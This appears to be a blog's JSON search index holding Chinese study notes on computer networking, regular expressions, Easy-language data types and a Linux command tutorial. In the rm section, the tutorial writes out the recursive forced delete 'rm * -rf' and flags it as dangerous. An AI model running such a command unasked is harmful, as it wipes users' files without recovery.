提高了系统的可靠性、可用性和残存性。 . . 媒体共享技术 静态划分信道 频分复用 时分复用 波分复用 码分复用 动态媒体接入控制（多点接入） 随机接入 受控接入 ，如多点线路探询(polling)，或轮询。","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"正则表达式","slug":"yyy0002正则表达式","date":"2021-03-29T08:23:07.000Z","updated":"2021-03-29T15:08:59.457Z","comments":true,"path":"2021/03/29/yyy0002正则表达式/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/yyy0002正则表达式/","excerpt":"","text":"正则表达式 点号应用之简单的数据提取 利用点匹配我们想要的数据并提取出来可以匹配任何一个单字符除换行符外 1个点号只能匹配字符,如123456789abcde… .等,必须为半角的如果想要匹配全半数字,字母，或汉字,就必须要2个点号 星号正则的认识与应用 *星号表示之前的元素出现任意次数或0次 比如: 4.*8我们来看一下他是什么意思，星号出现在点号的后面，这代表点号有出现也行，没有出现也行: 打个比方，他可以匹配48、41238、412345678、4012345670123458 问号和加号的认识与应用 连字符和范围描述符的认识与应用 在学习&quot;-&quot;连字符前，我们先来认识一个强大的符号: [ ]， 这个[ ]所括的内容，可以不按顺序进行匹配。[] 范围描述符 范围描述符。如: [a-z]表示从a到z之间的任意一个。 - 连字符 A一般都与&quot;[]”起使用，只有连字符在字符组内部 时，并且出现在两个字符之间时，才能表示字符的范围;如果出现在字符组的开头，则只能表示连字符本身 例如: [0-9]匹配任意0到9的数字 [a-z]匹配所有小写字母 [A-Z]匹配所有大写字母 当然，你可以把它们混在一起写成[a-z0-9]、[0-9a-zA-z]的样 子都可以下面我们举2个例子就明白了 必从一个网页源码中，区分出数字并提取出来 脱字符^和美元符$的认识与应用 排除:[^1-9]匹配除了1到9的数字,其他的都可以匹配 转义符\\的认识与应用 \\转义符作用:把正 则的元字符转换成元字符本身 如果需要匹配的某个字符本身就是元字符(如:.?*+) ，正则表达式将如何处理呢? 比如:我想要检索互联网的主机名，也就是我们说的网址,如: www.23 .com我们的正则语句要怎么写呢? 想的快的会员就会说，我直接就用www.23.com来匹配点号可以匹配任何字符包括点号本身，当然， 这样是可以匹配到。 但是，如果有www123.com www223. com它们同样也会被匹配出来，唯一的解决办法就是把点号用转义符转换成他自身。 字符组简记法 大括号与选择符的认识与应用 子表达式的认识与应用 贪婪和懒惰的匹配 通配符匹配规则： * ：任意数量的字符 ？：任何单个字符 正则 匹配规则： * 前面元素出现0次以上 . 匹配任何单个字符 ? 前面元素出现0次或1次 + 前面元素出现1次以上 ^ 表示开头。 $ 表示结尾。 .* 表示0个以上的任意字符。 [ ] 范围描述符。[a-z]表示从a到z之间的任意一个。 \\w 英文字母和数字。即[0-9 A-Z a-z]。 \\W 非英文字母和数字 \\s 空字符，即[\\t\\n\\r\\f]。 \\S 非空字符。 \\d 数字，即[0-9]。 \\D 非数字。 \\b 词边界字符（在范围描述符外部时） \\B 非词边界字符 \\b 退格符（0x08）（在范围描述符内部时） {m,n} 前面元素最少出现m次,最多出现n次 | 选择 ( ) 群组 其他字符 该字符本身","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"数据类型","slug":"yyy0001数据类型","date":"2021-03-29T07:07:49.000Z","updated":"2021-03-29T08:22:32.860Z","comments":true,"path":"2021/03/29/yyy0001数据类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/yyy0001数据类型/","excerpt":"","text":"数据类型 什么是变量的数据类型呢?实际就是指变量内所存储的数据的类型。 下面我们来讲讲变量内所能存储的基本数据类型。 1.字节型。 可容纳0到255之间的数值。 2.短整数型。 可容纳-32,768到32,767之间的数值，尺寸为2个字节。 3.整数型。 可容纳-2,147 ,483,648到2,147,483,647之间的数值，尺寸为4个字节。 4.长整数型。 可容纳-9,223,372,036,854,775,808到 9,223,372,036,854,775,807之间的数值，尺寸为8个字节。 5.小数型。 可容纳3.4E +/- 38 (7位小数)之间的数值，尺寸为4个字节。 6.双精度小数型。 可容纳1.7E +/- 308 (15位小数)之间的数值，尺寸为8个字节。 7.逻辑型。 值只可能为“真&quot;或“假”，尺寸为2个字节。“真&quot;和“假&quot;为系统预定义常量，其对应的英文常量名称为“true&quot;和false&quot;. 8.日期时间型。 用作记录日期及时间，尺寸为8个字节。 9.文本型。 用作记录一段文本，文本由以字节0结束的一系列字符组成。 10.字节集。 用作记录一段字节型数据。 字节集与字节数组之间可以互相转换，在程序中允许使用字节数组的地方也可以使用字节集，或者相反。字节数组的使用方法，譬如用中括号对(“[]&quot;)加索引数值引用字节成员，使用数组型数值数据进行赋值等等，都可以被字节集所使用。两者之间唯一的不同是字节集可以变长，因此可把字节集看作可变长的字节数组。 11.子程序指针。 用作指向一个子程序，尺寸为4个字节。 在以上的基本数据类型中，字节型、短整数型、整数型、长整数型、小数型、双精度小数型被统称为“数值型”，它们之间可以任意转换。不过编程需要注意转换可能带来的精度丢失。譬如:将整数257转换为字节后的结果为1，这是因为值257超出了字节型数据的最大上限255,从而产生了溢出。查看变量所可以使用的数据类型，在定义变量中双击类型就可以查看所支持的所有数据类型。 创建变量 局部变量 快捷键: ctrl + L 子程序内有效 全局变量 快捷键:ctrl +G 整个程序有效 程序集变量 点击程序集1按下回车键 整个程序集有效 变量可以先使用后声明 易语言规定用[]代表日期类型数据 [年-月-日 时-分-秒] [年:月:日 时:分:秒] [2020-1-1 11-11-22] [2020:1:1 11:11:22] 静态变量和非静态变量的区别 静态变量 经过第一次初始化之后,后面就不用初始化了 子程序结束,变量不释放 非静态变量 每次都会初始化 子程序结束,变量释放","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"介绍Android系统的发展历史和发行版本","slug":"介绍Android系统的发展历史和发行版本","date":"2021-03-28T16:11:26.000Z","updated":"2021-03-28T16:11:53.533Z","comments":true,"path":"2021/03/29/介绍Android系统的发展历史和发行版本/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/介绍Android系统的发展历史和发行版本/","excerpt":"","text":"","categories":[{"name":"Android","slug":"Android","permalink":"https://xiaowuyoucy.github.io/categories/Android/"}],"tags":[]},{"title":"易语言介绍","slug":"易语言介绍","date":"2021-03-28T16:09:38.000Z","updated":"2021-03-29T06:39:47.350Z","comments":true,"path":"2021/03/29/易语言介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/易语言介绍/","excerpt":"","text":"官方网站 http://www.dywt.com.cn/","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"第二章 物理层","slug":"计算机网络原理笔记-第二章-物理层","date":"2021-01-10T08:53:04.000Z","updated":"2021-01-14T07:41:11.865Z","comments":true,"path":"2021/01/10/计算机网络原理笔记-第二章-物理层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/01/10/计算机网络原理笔记-第二章-物理层/","excerpt":"","text":"计算机网络原理 第二章 物理层 2.1 物理层的基本概念 2.2 数据通信的基础知识 相关术语 有关信道的几个基本概念 2.3 物理层下面的传输媒体 2.4 信道复用技术 2.5 数字传输系统 2.6 宽带接入技术 2.1 物理层的基本概念 物理层解决如何在连接各种计算机传输媒体上传输bit流，注意，不是指用什么传输媒体（介质） 物理层主要任务：确定传输媒体接口的一些特性：（为了统一规划，标准化，各个厂商生产一致，可以通用） 机械特性：接口形状 大小 引线数目 网线内有几根线 电气特性：例如规定电压范围 功能特性：例如规定-5V表示0 +5V表示1（电压信号代表数字信号） 过程特性：（规程特性）规定建立连接时各个部件的工作步骤 2.2 数据通信的基础知识 数据通信模型（图） 相关术语 通信的目的是传送消息 数据（data）：运送消息的实体 信号（signal）：数据的电气或电磁表现 –模拟信号：代表消息的参数取值连续（如电压高低电平代表01数据） –数字信号：代表消息的参数取值离散 码元（code）：在使用时间域的波形表示数字信号时，则代表不同 离散数值的基本波形就称为码元 在数字通信中常常用时间间隔相同的符号来表示一个二进制数字，这样的时间间隔内的信号称为二进制码元，而这个间隔被称为码元长度，1码元可以携带n bit的信息量 解释： 如果信号一共用2种可能，那么1码元代表1bit信息（只有高低电平） 如果信号一共用4种可能，那么1码元代表2bit信息，00 01 10 11，码元有四种可能，一码元代表2bit …… 如果信号一共用2的n次方种可能，那么1码元代表nbit信息。 有关信道的几个基本概念 信道一般表示向一个方向传送的信息的媒体。所以咱们说平常的信息线路往往包含一条发送信息的信道和一条接受信息的信道。 单向通信（单工通信）–只能发送或只能接收 例子：电视塔发送电视信号，但是电视无法向电视塔发送信号 双向交替通信（半双工通信）–双方可以收发，但是不能同时发送或同时接收 双向同时通信（全双工通信）–通信的双方可以同时发送和接收消息 例子：打电话 计算机通信大多数是半双工和全双工通信 基带信号（baseband）和带通信号（band pass） 前提：信号是会衰减的，比如人说话，当距离较远之后，声音就会听不到。 基带信号（baseband）：来自信息源的信号。 带通信号（band pass）：把基带信息经过载波调制后的信号（载波调制就是把信号的频率搬到较高的频段，以便传输） 因此，如果传输距离短，信息衰减可以接受，那就直接使用基带信号，如果距离长，信号衰减大，那就得通过调制将基带信号转换为带通信号，以减小衰减，接收方收到后再进行解调，分析成基带信号进行解读。 几种基本调制方法： 调幅 调频 调相 具体见图： （数字信号的）编码格式： 单极性不归零码 双极性不归零码 单极性归零码 双极性归零码 归零码：一次信号结尾始终为0电压 不归零码：一次信号结尾不需要归零 单极性：只有正向和0电压 双极性：有正负电压 曼彻斯特编码：低电平跳高电平代表0 高电平条低电平代表1，可以代表没有数据传输（用电平变化代表数据传输） 差分曼彻斯特编码：0和1没有固定高低电平，后面的信号是几取决于前面的信号 信道极限容量：信号波形在实际信道传输时，会受到带宽受限、噪声、干扰等引起失真。 奈氏准则：在理想条件下，为了避免码间串扰（码元太短，无法识别高低电平），码元传输速率是有上限的（上一章带宽可以无限增加吗例子） 信噪比：带宽受阻且有高斯白噪声干扰的信道的情况下，信道的极限无差错信息传输速率信道的极限信息传输速率C的计算公式：（香农公式） C = Wlog2(1+S/N) b/s (log2是log以2为底) W：信道带宽（单位Hz） S：信道内所传信号的平均功率 N：信道内部高斯噪声功率 香农公式的结论： 1信道的带宽或信道的信噪比(S/N)越大，信息极限传输速率越高，若W或S/N没有上限，则C没有上限（实际不可能） 2只要信息传输速率低于信道极限信息传输速率，则一定可以找到方法确保数据的无差错传输 实际上信道所能达到的速率比香农公式计算出的低不少 例子：每分钟说200字，外面有噪声，降低说话速度，来确保收听者听到 又例如：无线网的衰减：路由器和计算机在相同房间，计算机速率150M，计算机搬到隔壁，速率只剩下100M，因为隔了一道墙，要确保可靠传输就要降低速率，墙可以理解为噪声。 2.3 物理层下面的传输媒体 导向传输媒体：电磁波沿着固体介质传播 双绞线 –屏蔽双绞线STP（铜线绞在一起，避免电流相互作用，减少干扰） –无屏蔽双绞线UTP（比上面多了一层绝缘层，避免外界干扰） 同轴电缆 （结构和有线电视的电线一样） –50欧姆同轴电缆用于数字传输，多用于基带传输，也叫基带同轴电缆 –75欧姆同轴电缆用于模拟传输，即宽带同轴电缆 光缆 单模光纤 多模光纤 非导向传输媒体（无线传输）：无线传输所使用的频段很广。 短波通信主要是靠电离层的反射，但短波信道的通信质量较差。 微波在空间主要是直线传播。 地面微波接力通信 卫星通信 2.4 信道复用技术 目的：多用户同时传输，不会相互影响。提高信道利用率 频分复用 FDM(Frequency Division Multiplexing) 用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。 频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。 解释：特定的用户使用特定的频率波段，传输时采用不同频率的波段进行调制和解调，已达到区分其他数据的目的 时分复用TDM(Time Division Multiplexing) 时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。 每一个用户所占用的时隙是周期性地出现（其周期就是 TDM 帧的长度）。 TDM 信号也称为等时(isochronous)信号。 时分复用的所有用户是在不同的时间占用同样的频带宽度。 时分复用可能会造成线路资源的浪费 ： 使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。 统计时分复用 STDM(Statistic TDM) 与时分复用类似，只不过每次发送时标记是哪个用户发出的，解析时按标记解析。可以避免线路资源的浪费 波分复用 WDM(Wavelength Division Multiplexing) 波分复用就是光的频分复用。 码分复用 CDM(Code Division Multiplexing) 常用的名词是码分多址 CDMA (Code Division Multiple Access)。 各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。 每一个比特时间划分为 m 个短的间隔，称为码片(chip)。 2.5 数字传输系统 脉码调制 PCM 体制：最初是为了在电话局之间的中继线上传送多路的电话。 由于历史上的原因，PCM 有两个互不兼容的国际标准，即北美的 24 路 PCM（简称为 T1）和欧洲的 30 路 PCM（简称为 E1）。我国采用的是欧洲的 E1 标准。 E1 的速率是 2.048 Mb/s，而 T1 的速率是 1.544 Mb/s。当需要有更高的数据率时，可采用复用的方法。 E1取样8000次/s 每个码元代表8位bit E1 采用时分复用技术 32路同时传输 8800032 = 2.048Mb/s T1只有24路同时传播，且有控制信号 8800024+8K=1.544Mb/s(8K表示控制信号) 2.6 宽带接入技术 ADSL (Asymmetric Digital Subscriber Line)：非对称数字用户线（就是通过电话线上网） 用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务。把 0~4 kHz 低端频谱留给传统电话使用，而把原来没有被利用的高端频谱留给用户上网使用。 ADSL实现原理采用DMT技术 DMT 调制技术采用频分复用的方法，把 40 kHz 以上一直到 1.1 MHz 的高端频谱划分为许多的子信道，其中 25 个子信道用于上行信道，而 249 个子信道用于下行信道。每个子信道占据 4 kHz 带宽（严格讲是 4.3125 kHz），并使用不同的载波（即不同的音调）进行数字调制。这种做法相当于在一对用户线上使用许多小的调制解调器并行地传送数据。 ADSL上网图解： 光纤同轴混合网 HFC (Hybrid Fiber Coax)（就是利用有线电视线路上网） HFC 网是在目前覆盖面很广的有线电视网 CATV 的基础上开发的一种居民宽带接入网。HFC 网除可传送 CATV 外，还提供电话、数据和其他宽带交互型业务。现有的 CATV 网是树形拓扑结构的同轴电缆网络，它采用模拟技术的频分复用对电视节目进行单向传输。而 HFC 网则需要对 CATV 网进行改造。 HFC 的主要特点 HFC网的主干线路采用光纤 HFC 网将原 CATV 网中的同轴电缆主干部分改换为光纤，并使用模拟光纤技术。 在模拟光纤中采用光的振幅调制 AM，这比使用数字光纤更为经济。 模拟光纤从头端连接到光纤结点(fiber node)，即光分配结点 ODN (Optical Distribution Node)。在光纤结点光信号被转换为电信号。在光纤结点以下就是同轴电缆 HFC结构示意图","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"第一章 概述","slug":"计算机网络原理笔记-第一章-概述","date":"2021-01-10T08:15:21.000Z","updated":"2021-01-13T10:12:33.989Z","comments":true,"path":"2021/01/10/计算机网络原理笔记-第一章-概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/01/10/计算机网络原理笔记-第一章-概述/","excerpt":"","text":"第一章 概述 计算机网络基础（韩立刚视频笔记）第一章 概述 第一章（概述） 局域网 广域网 OSI参考模型 OSI架构图 各层间的数据传输 网络排错 OSI网络参考模型和网络安全的例子 计算机网络性能指标 第一章（概述） 局域网 覆盖范围小，自己单位维护，带宽固定（由硬件决定） 100米 带宽小 多台计算机连接到接入层交换机 多台接入层交换机连接到汇聚层交换机 每一层都是一个星型结构 接入层交换机：接入口多 汇聚层交换机：连接各个接入层交换机，端口带宽高 广域网 距离远 花钱买服务 花钱租带宽 ISP（Internet Server Provider）网络服务提供商 自己的机房 对网民提供Internet服务 运营的网站放在运营商服务器机房 运营商直之间只有一条线路连接，所以这条线路会成为通信速率瓶颈，也是为什么我们跨运营商访问网站比较慢的原因 物理地址的作用：数据传输时记录当前物理地址和下次的传输物理地址 IP地址的作用：记录当前IP地址和目标IP地址 OSI参考模型 应用层 能产生流量的程序 表示层 加密 压缩等处理 传输格式（二进制 ASCII码）乱码是表示层问题（开发者处理） 会话层 可以查木马 netstat -n查看链接状态 netstat -nb 查看连接由谁创建 传输层 可靠传输 流量控制 不可靠传输 网络层 选择最佳路径 规划IP地址 数据链路层 标记帧的开始和结束 透明传输 差错校验 交换机速度 物理层 网络设备接口标准 电器（气？）标准 如何在物理链路进行更快的传输（电压 接口数量 接口类型 通信介质：光纤 网线 双绞线） 分层的好处：7层相互独立，某一层变化不会影响其他层（相当于软件开发的耦合性小的意思） 比如在应用程序写入服务器的IP地址是不符合分层的思想的，万一服务器的IP地址修改 应用程序就挂了（IP地址是网络层的内容，应用程序属于应用层） 各层关系：低层向高层提供服务 OSI架构图 各层间的数据传输 数据封装 （途中的五层架构，就是OSI架构图右侧的五层架构） 网络排错 从底层向上排除 1.物理层故障：网络连接状态 查看发送和接收数据包 2.数据链路层故障：MAC地址冲突 ADSL欠费 网速无法协商 计算机连接到错误的VLAN 3.网络层故障：配置了错误的IP 子网掩码 网关，路由器没有配置可达目标的路由 4.应用层故障：（上四层都在这里说）应用程序配置错误（如如浏览器配置了错误的代理） OSI网络参考模型和网络安全的例子 1.物理层安全 一栋大厦是保险公司的，建造时布好网线，使用时10层租给了其他公司，其他公司通过原先布好的网线就可以访问保险公司网络。（别人应该无法私自连接到你的网络，租售10层时 应将网线断开服务器，或配置将网络断开） 2.数据链路层安全 上网时 ADSL 上网账号密码 VLAN划分 交换机绑定固定MAC地址 3.网络层安全 路由器上使用ACL控制数据包流量（指定IP才传输） 防火墙设置 4.应用层安全 开发的应用程序没有漏洞（比如没有SQL注入漏洞等等） 计算机网络性能指标 1.速率 连接在计算机网络上的主机在数字信道上传送数据位数的速率（data rate，bit rate）单位为b/s,kb/s,Mb/s,Gb/s 这就是我们常说的“我家装的100M的带宽”，不过，有些网站测速显示的速率是按字节来表示的，即需要拿100M/8得到网站显示数据 还有交换机的带宽为100M，100M其实是100Mb/s 2.带宽 数据通信中，数字信道所能传输的最高速率，单位为b/s,kb/s,Mb/s,Gb/s 注意，这也是一个速率，只不过是最大速率，和上面的理解几乎一样，多数情况受硬件限制 3.吞吐量 单位时间内通过某个网络数据量（有可能是几条数据链路流量和） 4.时延 也就是我们平时玩游戏说的延时 时延包括 发送时延 传播时延 处理时延 排队时延 发送时延 = 数据块长度（bit）/信道带宽（bit/s）=N s 加带宽是减少发送时延 传播速度由介质介质决定，介质固定，传播速度固定 带宽可以无限增加吗？ 不可以：数据块长度固定，增加带宽意味着发送时间变短，同时数据块在信道中的长度也变短了（波形长度 = 发送时间 * 传播速度），之前说过传播速度由介质决定，一般固定，那么发送时间越短，波形越短，短到一定程度，接收方就无法识别高低电平了 铜线和光纤的对比： 铜线的传播速率其实和光纤的速率接近，那为什么使用光纤呢？因为光纤支持更高的发送速率，光纤使用光信号，即使数据很短，也能解析出高低电平。而铜线使用电信号，波形太短，无法识别高低电平。 5.时延带宽积=传播时延*带宽 6.往返时间（RTT Round-Trip Time） ping出的时间就是往返时间 &gt;2000ms请求超时 7.利用率 最形象的例子是汽车和公路。以汽车类比数据块，以高速公路类比网络光纤。当汽车较少时，利用率较低，但汽车开的很快，延时较低。如果遇到节假日，高速公路塞满了汽车，公路利用率高了，同时延时也高了，因为车已经开不快了，堵车啊。。。 网络模式: 单工模式：只能发或收 电视台 广播 半双工模式: 可以发和收，但不能同时进行 对讲机 全双工模式: 可以同时发和收 互联网 电话 无线网的带宽 由网络强度决定 集线器 物理层 交换机 物理层 数据链路层 路由器 物理层 数据链路层 网络层","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"linux1-2","slug":"001linux1-2","date":"2020-11-18T09:24:59.000Z","updated":"2020-11-18T16:29:51.407Z","comments":true,"path":"2020/11/18/001linux1-2/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/11/18/001linux1-2/","excerpt":"","text":"操作系统的作用: 使计算机系统易于使用 有效管理系统资源 方便用户开发、测试和引进新功能 向下封装硬件，向上提供操作接口 linux分为内核版本和发行版本 内核源码网站：www.kernel.org 发行版本就是给系统披上了UI 文件系统: 采用 “路径” + “文件名” linux 采用 ‘’/&quot; 且没有盘符 路径分为: 绝对路径 相对路径 ./表示当前目录 ../表示上一级目录 linux目录结构 / 根目录 /home 家目录 /bin 放工具(可执行文件) /lib 库文件 /usr/include 头文件 文件权限 文件分类 普通文件 - 目录文件 d 设备文件 c字符设备 b块设备 管道文件 链接文件 文件类型 文件所有者 用户组 其他人 - rwx rwx rwx -rwxrwxrwx 查看用户组信息 1cat /ect/gruop 查看用户信息 1cat /ect/passwd 用户名: x : 用户id : 组id 文件目录的x权限代表可进入权限 一般情况下linux/unix只允许文件所有者或超级用户(root)改变文件权限 命令 [-可选参数1] [-可选参数n] []是可选参数 查命令 使用–hellp 查手册 用man命令 1man [选项] 命令名 按q退出 enter下一行 空格下一屏 h列出所有功能键 /字符串 搜索所有该字符串 可以使用方向键操控 以章节方式分类 1代表命令 2代表系统调用 3代表库调用 1man 3 printf //查询printf函数使用说明 按tab键可以补全命令 方向键可以查使用过的命令 history 命令 列出历史命令(连续重复的命令只列举一次) ls 遍历当前目录 ls [-选项] -a 遍历所有子目录与文件 -l 详细显示信息 -h 以人性化方式显示文件大小 使用方式 1234ls -ahlls -als -lll #等价于 ls -l 一个文件夹默认有两个目录,一个是.另一个是.. 分别代表当前目录和上一级目录。 文件类型 权限 硬连接数目 文件所有者 用户组 文件大小 创建日期 文件名/目录 如果是文件夹,硬链接数目代表其下有多少子目录 touch 创建文件 123touch 文件名touch abctouch 文件名1 文件名2 文件名3...文件名n 如果文件存在则修改日期时间为当下时间,否则则创建新文件 ? 代表任意一个字符 [abc] 匹配a、b、c中任意一个字符 [a~z] 匹配a~z中任意一个字符 \\ 转义字符 1234ls ?.cls a.?ls [a~d]*ls [abc].? 输出重定向命令: &gt; 将命令执行结果重定向到一个文件上 1234ls &gt; text.txt #如果文件不存在,则创建.存在则覆盖ls &gt;&gt; a.txt #如果文件不存在,则创建.存在则追加内容,不覆盖set -C #禁止覆盖set +C #解除禁止覆盖 分屏显示:more 12more 文件名more abc 按q退出 空格下一页 h帮助 管道:| 一个命令的输出可以通过管道做为另一个命令输入 输出|输入 123ls | grep std #从ls中搜索std字符ls | more 从切换工作目录 cd Linux所有的目录或文件名大小写敏感 12345678910#切换到当前用户的主目录(/home/用户目录)cd ~ #当前目录cd . #上一级目录cd ..#上一次进入的目录cd -cd 相对路径和绝对路径cd ~/share #等价于cd /home/用户名/share 查看当前路径 pwd 清屏 clear 1clear ctrl+l也可以 创建文件夹 mkdir 1234mkdir 文件名mkdir 123 #创建一个123的文件夹mkdir /home/yc/aaa #指定路径创建一个aa文件夹mkdir -p /home/yc/a/b/c #递归创建 创建者需要有当前文件夹写的权限 删除文件夹 rmdir 12rmdir 文件夹名rmdir aaa 文件夹必须是空的才可以删除 rm 可以删除非空文件夹或文件 -f不提示 -r删除文件夹 -i交互式删除 1234rm 文件rm -r 文件夹rm * -rf #危险操作rm 文件1 文件2 文件3...文件n 建立链接文件 ln 硬链接: 给某个文件拷贝一份,这两个文件独立存在 改变其中一个,另一个也会改变 删除某个硬链接,不会影响另一个文件 只能链接普通文件,不能链接目录 12ln 源文件 链接文件ln 1.txt a.txt #a.txt是硬链接文件 软链接: 类似windows的快捷方式 如果源文件删除,软连接文件没有意义 12ln -s 源文件 链接文件ln -s aaa bbb 和windows快捷方式的区别: 假设有一个软连接目录是aaa,源文件是b,进入aaa路径会显示xx/aaa而不是xx/b,aaa实际上是b的别名,实际进入的是b目录 软链接文件的大小是固定的 gedit 图形化文本编辑 1gedit 文件名 文件存在就打开,不存在就创建一个 查看或合并文本内容 cat 1234cat 文件名cat 文件名1...文件名ncat 文件名1 文件名2 文件名n &gt;&gt; 文件名x1 #追加合并文本内容cat 文件名1 文件名2 文件名n &gt; 文件名x1 #覆盖合并文本内容 文本搜索 grep grep [-选项] '字符串' 文件名 字符串最好用双引号括起来 -v求反 -n显示行号 -i不区分大小写 12grep \"sss\" 1.txtgrep aaa 1.txt -n 正则表达式 ^a代表以a开头 ke$以ke结尾 [1~9]1~9中任意一个 [1~9]aaa[1~9]aaa是固定字符 .a.点代表任意一个字符,a是固定字符 ?和*失效 1ls | grep ^a 查找文件 find ​ find 路径 -name 文件名 find 路径 -size 文件大小 find 路径 -perm 0777 12345678find ./ -size 2M #搜索等于2M的文件find ./ -size +2M #搜索大于2M的文件find ./ -size -2M #搜索小于2M的文件find ./ -size +4k -size -5M #搜索大于4k小于5M的文件find 路径 -perm 0777 #搜索777权限的文件find ./ -name abcfind ./ -name \"*.ssh\"find ./ -name \"[a-z]*\" 拷贝文件 cp cp 源文件或目录 文件名 [-选项] -a保持文件原有属性 -f不提醒 -i交互式复制 -r递归复制目录 -v显示进度 12cp ./a /b -rcp ./1.txt ./a/b 移动文件 mv 用来移动或重命名文件或目录 -f 不提示 -i 交互式移动 -v显示进度 123mv ./a.txt ./b mv ./a.txt ./b.txt #重命名mv ./a / 获取文件类型 file file 文件名 executable 可执行文件 ASCII text 文本文件 编译文件 gcc 源文件 -o 文件名 运行程序 直接输入路径+文件名 1./a.exe 归档管理 tar 打包和解包但不压缩 tar [参数] 打包文件名 源文件 -可以不写 打包 1234tar -cvf 打包名称.tar 源文件c 创建包 v 进度 f 后面是打包名,f放最后tar -cvf aaa.tar * 解包 12345tar -xvf 包名tar -xvf 包名 -C 路径指定路径要加大写C,x代表解包 tar -xvf aaa.tar gzip压缩和解压 1gzip xxx.tar #自动生成一个xxx.tar.gz压缩包 -r代表压缩,一般省略不写 -d代表解压 12gzip -r xxx.tar xxx.tar.gz加了-r xxx.tar.gz要自己写 解压 1gzip -d xxx.tar.gz bzip2 解压/压缩 12bzip2 xxx.tar #压缩bzip2 -d xxx.tar.bz2 #解压 打包压缩 指定路径要加 -C gzip 1tar -czvf xxx.tar.gz *.* bzip2 1tar -cjvf xxx.tar.bz2 *.* 1tar -cjvf xxx.tar.bz2 -C ./my/*.* 解压解包 gzip 1tar -xzvf xxx.tar.gz bzip2 1tar -xjvf xxx.tar.bz2 1tar -xjvf xxx.tar.bz2 -C ./my/ 文件压缩和解压 zip unzip 压缩 zip 12zip -r 压缩文件名-r是必须要加的 解压 unzip 12unzip -d 压缩包名unzip -d ./text.zip 查看命令所在目录 which 12which 命令名which ls who查看最近登录的用户 1who w 查看最近登录的用户,显示ip 1w exit 退出当前用户 1exit 如果是图像界面终端,退出当前终端 如果是使用ssh远程登录,退出登录用户 如果是切换后的登录用户,退出则返回上一个登录账户. su 切换用户 123456su #切换到root用户su root #切换root用户su - #切换root用户,同时切换到/root目录su - root #切换root用户,同时切换到/root目录 -两边都有空格su 普通用户su - 普通用户 sudo 运行普通用户执行一些或全部的root命令的一个工具,减少了root用户的登录和管理时间,提高安全性 需要root权限 添加删除组账号:groupadd groupdel groupadd 新建组账号 groupdel删除组账号 如果有用户属于组了,就不能删组了,把用户移出该组才可以删 groupadd 组名 groupdel组名 12groupadd abcgroupdel abc 修改用户所在组 usermod usermod -g 用户组 用户名 1usermod -g root abc 查看用户组信息 cat /etc/group 查看用户信息 cat /etc/passwd yxc19980620c:x:1000:0:yc:/home/yxc19980620c:/bin/bash 1000代表用户id 0代表用户组id 添加用户 useradd或adduser 添加用户时需要在/home目录下添加一个和新建用户同名的文件夹 useradd和adduser功能完全一样 useradd -d 用户文件夹 用户名 -m useradd -d /home/abc abc -m 12useradd -d 用户文件夹 用户名 -m useradd -d /home/abc abc -m -d代表指定用户文件夹 -m代表如果用户文件夹不存在则新建一个用户文件夹 新建用户并指定用户组 useradd -d 用户文件夹 用户名 -g 用户组 -m 1useradd -d /home/abc abc -g root -m 删除用户 userdel 12userdel 用户名 #不会自动删除用户的主目录userdel 用户名 -r #会同时删除用户的主目录 给用户添加密码 passwd 12passwd 用户名passwd abc 查看用户登录情况 last 1sudo last 修改文件权限 chmod 字母法: chmod 修改权限 文件名 u 用户所有者 g 用户组 o 其他人 123+ 代表加权限- 代表减权限= 赋值权限 12345chmod u+x 1.c #给1.c文件添加所有者x执行权限chmod g-x 1.c #给1.c文件减去所属组x执行权限chmod o=rwx #给1.c文件赋予其他人rwx权限 数字法 123u g o0 0 0第一个数字0 对应着u权限 123456789rwx--- 000 代表没有权限r-- 100 4-w- 010 2--x 001 1rw- 110 6r-x 101 5-wx 011 3rwx 111 7 123chmod 777 1.c #代表1.c的权限是-rwx rwx rwxchmod 444 1.c #代表1.c的权限是-r--r--r-- 文件夹权限说明 目录没有x权限,表示不能进此目录 没有r权限,不能查看文件夹内容 没有w权限,不能新建或删除,修改文件 改变文件所有者 chown 12chown 用户名 文件或目录chown root aa 改变文件所属组 chgrp 12chgrp 用户组 文件或目录chgrp root aa 查看当前日历 cal 12calcal -y #查看一年的日历 显示或设置时间 date 1date 查看进程信息 ps 1ps -aux 可以不用加- -a显示所有进程,包括其他用户进程 -u显示进程的详细信息 -x 显示没有控制终端的进程 -w显示加宽,以便显示更多的详细 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND USER 用户名 PID 进程ID %CPU 进程占用的CPU百分比 %MEM 占用内存的百分比 VSZ 该进程使用的虚拟內存量（KB） RSS 该进程占用的固定內存量（KB）（驻留中页的数量） TTY //该进程在哪个终端上运行，若与终端无关，则显示? 若为pts/0等，则表示由网络连接主机进程。 STAT 进程的状态 START 该进程被触发启动时间 TIME 该进程实际使用CPU运行的时间 